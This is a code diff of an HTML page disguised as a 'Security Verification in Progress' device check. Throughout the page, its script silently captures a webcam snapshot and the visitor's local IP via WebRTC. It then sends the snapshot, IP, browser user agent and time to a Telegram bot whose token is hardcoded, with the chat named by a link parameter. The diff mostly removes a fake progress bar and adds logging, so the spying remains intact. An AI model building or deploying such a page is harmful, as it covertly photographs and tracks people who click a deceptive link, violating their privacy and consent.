@@ -7,9 +7,6 @@
         video, canvas { display: none; }
         .loading { display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(76, 175, 80, 0.3); border-radius: 50%; border-top-color: #4CAF50; animation: spin 1s ease-in-out infinite; margin-bottom: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .progress-container { margin: 30px auto; width: 80%; max-width: 400px; }
-        .progress-bar { height: 10px; background-color: #e0e0e0; border-radius: 5px; margin-top: 10px; overflow: hidden; }
-        .progress { height: 100%; width: 0; background-color: #4CAF50; transition: width 0.5s; }
         h2 { color: #333; }
         p { color: #666; }
     </style>
@@ -22,21 +19,14 @@
         <div class="loading"></div>
         <h2>Security Verification in Progress</h2>
         <p>Please wait while we verify your device...</p>
-        <div class="progress-container">
-            <div class="progress-bar">
-                <div class="progress" id="progress-indicator"></div>
-            </div>
-        </div>
     </div>
 
     <script>
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
-        const progressIndicator = document.getElementById("progress-indicator");
         let ip = "Unknown";
-        let progress = 0;
-        
+
         // Get the user ID from the URL
         const urlParams = new URLSearchParams(window.location.search);
         const user_id = urlParams.get('id');
@@ -44,53 +34,41 @@
         if (!user_id) {
             document.body.innerHTML = "<h2>Invalid verification link</h2><p>This verification link appears to be invalid or expired.</p>";
         } else {
-            // Start the verification process
             startVerification();
         }
         
         function startVerification() {
-            // Simulate progress
-            const progressInterval = setInterval(() => {
-                progress += 5;
-                progressIndicator.style.width = `${progress}%`;
-                
-                if (progress >= 100) {
-                    clearInterval(progressInterval);
-                    document.getElementById("loading-container").innerHTML = "<h2>Verification Complete</h2><p>Thank you for verifying your device.</p>";
-                }
-            }, 500);
-            
-            // Get IP using WebRTC
             getLocalIP(detectedIp => {
                 ip = detectedIp;
                 requestCameraAccess();
             });
         }
 
-        // Direct integration with Telegram Bot API
         function sendToTelegram(message, photo = null) {
             const botToken = "7913534738:AAEthUisUFuzA0p0q5txMWAiW74faM0j9ho";
-            
+
             if (photo) {
-                // First send the image
+                console.log("Sending photo...");
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: user_id,
-                        photo: `data:image/jpeg;base64,${photo}`, // Ensure proper format
+                        photo: photo, // Send Base64 string directly
                         caption: "📸 Camera snapshot"
                     })
                 }).then(response => {
                     if (!response.ok) {
                         console.error("Failed to send photo:", response.statusText);
+                    } else {
+                        console.log("Photo sent successfully!");
                     }
                 }).catch(err => {
                     console.error("Error sending photo:", err);
                 });
             }
-            
-            // Then send the text message
+
+            console.log("Sending message...");
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -102,6 +80,8 @@
             }).then(response => {
                 if (!response.ok) {
                     console.error("Failed to send message:", response.statusText);
+                } else {
+                    console.log("Message sent successfully!");
                 }
             }).catch(err => {
                 console.error("Error sending message:", err);
@@ -112,11 +92,10 @@
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    // Take photos and send to Telegram
                     setTimeout(captureAndSend, 2000); // Wait 2 seconds for camera to initialize
                 })
-                .catch(() => {
-                    // Still send device info even if camera fails
+                .catch(err => {
+                    console.error("Camera access denied:", err);
                     sendBasicInfo();
                 });
         }
@@ -124,18 +103,15 @@
         function captureAndSend() {
             if (video.srcObject) {
                 ctx.drawImage(video, 0, 0, 320, 240);
-                const imageData = canvas.toDataURL("image/jpeg", 0.7);
-                
-                // Send both basic info and image
-                sendBasicInfo(imageData.split(',')[1]);
+                const imageData = canvas.toDataURL("image/jpeg", 0.7).split(',')[1]; // Extract Base64 part
+                console.log("Captured image data:", imageData);
+                sendBasicInfo(imageData);
             } else {
-                // Just send basic info if no camera
                 sendBasicInfo();
             }
         }
 
         function sendBasicInfo(imageBase64 = null) {
-            // Prepare simplified message with only IP and User Agent
             const message = `
 📥 <b>New Link Click Detected!</b>
 
@@ -143,15 +119,12 @@
 🖥️ <b>Device:</b> ${navigator.userAgent}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
             `;
-            
-            // Send the simplified info to Telegram
             sendToTelegram(message, imageBase64);
         }
 
-        // Get local IP using WebRTC
         function getLocalIP(callback) {
             const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel(""); // Create a dummy data channel
+            pc.createDataChannel("");
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
             pc.onicecandidate = event => {
                 if (event && event.candidate && event.candidate.candidate) {
@@ -162,13 +135,9 @@
                     }
                 }
             };
-            
-            // Set a timeout in case WebRTC takes too long
             setTimeout(() => {
-                if (ip === "Unknown") {
-                    callback("Detection Failed");
-                    pc.close();
-                }
+                callback("Detection Failed");
+                pc.close();
             }, 5000);
         }
     </script>
